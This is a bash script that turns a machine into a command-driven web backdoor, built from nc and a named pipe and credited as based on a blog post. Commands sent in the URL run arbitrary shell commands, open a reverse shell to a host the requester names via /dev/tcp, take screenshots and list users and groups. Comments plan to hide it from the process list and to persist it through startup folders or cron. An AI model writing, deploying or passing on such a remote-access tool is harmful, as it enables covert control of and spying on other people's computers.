#!/bin/bash
# pass in document root as first arg
# web.sh ~/Sites/test
#credits https://paulbuchheit.blogspot.ca/2007/04/webserver-in-bash.html

#todo periodic running to hide from process list
DOC_ROOT=./tmp #$1
RESP=./tmp/webresp
mkdir $DOC_ROOT
[ -p $RESP ] || mkfifo $RESP
#MYIP=$(ip route show | grep -o 'src [\.0-9]\+' | uniq | cut -d ' ' -f2)
MYIP=localhost
PORT=9000
while true ; do
( cat $RESP ) | nc -l -p $PORT | sed -ue 's/\r//g' | (
REQ=`while read L && [ -n "$L" ] ; do echo "$L" ; done`
SERV_PATH=`echo "$REQ" | head -1 | cut -f2 -d" " `
FULL_PATH="$DOC_ROOT$SERV_PATH"
command=$(echo $SERV_PATH | cut -d '?' -f 2)
args1=$(echo $SERV_PATH | cut -d '?' -f 3)
args=$(echo $args1 |sed -e 's/%21/!/g' -e 's/%23/#/g' -e 's/%24/$/g' -e 's/%26/\&/g' -e "s/%27/'/g" -e 's/%28/(/g' -e 's/%29/)/g' | sed s/"%20"/" "/g | sed s/"%27"/"'"/g |sed s/"%3E"/">"/g )

echo $command
path=`echo $SERV_PATH | cut -d "?" -f1`
cat $DOC_ROOT/server > $DOC_ROOT/servers
if [ $command ]; then

#echo "================RESPONSE==================<br>"
    if [ "$command" == "ping" ];then
        echo $(cat ./server;ping -c 1 127.0.0.1 ) > $DOC_ROOT/servers
        #ping > DOC_ROOT/stats.txt
    fi
    if [ "$command" == "uname" ];then
        echo $(cat "./server";uname -a ) > "$DOC_ROOT/servers"
    fi
    if [ $command == eject ];then
        eject -T /dev/sr0
    fi
    if [ $command == bash ];then
       $args
    fi
    if [ $command == beep ];then
           echo 'beepsoundccccccccccc ' > /dev/dsp
    fi
    if [ $command == proxy ];then
          echo "$args"
    fi
   # if [ $command == chat ];then
            #zenity
           #libnotify
   # fi
   # if [ $command == lockscreen ];then
   # fi
    if [ $command == reverse ];then
        #todo perodic 
       bash -i >& /dev/tcp/$args/8080 0>&1 
        #put in ~/home and root startup folders / maybe make cron script
    fi
    if [ $command == all ];then
        echo $(cat ./server;uname -a;echo "<br><br>") > $DOC_ROOT/servers
        echo $(ping -c 1 $MYIP;echo "<br>" ) >> $DOC_ROOT/servers
        echo $(echo $MYIP;echo "<br>") >> $DOC_ROOT/servers   
    fi
    if [ $command == screen ];then
        import -window root $DOC_ROOT/screen.png
        convert $DOC_ROOT/screen.png -resize 50% $DOC_ROOT/screen.png
        echo $(cat server;echo '<img alt="Embedded Image" src="data:image/png;base64,'; base64 $DOC_ROOT/screen.png;echo '" />' ) > $DOC_ROOT/servers
    fi
    if [ $command == getip ];then
        MYIP=$(ip route show | grep -o 'src [\.0-9]\+' | uniq | cut -d ' ' -f2)
        echo $(cat server; echo $MYIP;echo "<br>") > $DOC_ROOT/servers
    fi
    if [ $command == users ];then
        echo $(cat server;getent passwd | awk -F: '{print $1}' | while read name; do groups $name; done;echo "<br>") > $DOC_ROOT/servers
     fi
SERV_PATH=$(echo $path)
FULL_PATH="$DOC_ROOT$SERV_PATH"
else
echo "no command"
fi

echo $FULL_PATH
if [ -f "$FULL_PATH" ]; then
RESP_BODY=`cat $FULL_PATH`
RESP_CODE="200 OK"
else
RESP_BODY="not found<br/><br/>$REQ"
RESP_CODE="404 NOT FOUND"
fi
echo "[`date '+%Y-%m-%d %H:%M:%S'`] $REQ" | head -1
cat >$RESP <<EOF
HTTP/1.0 $RESP_CODE
Cache-Control: private
Content-Type: text/html
Server: bash/2.0
Connection: Close
Content-Length: ${#RESP_BODY}

$RESP_BODY
EOF
)
done 
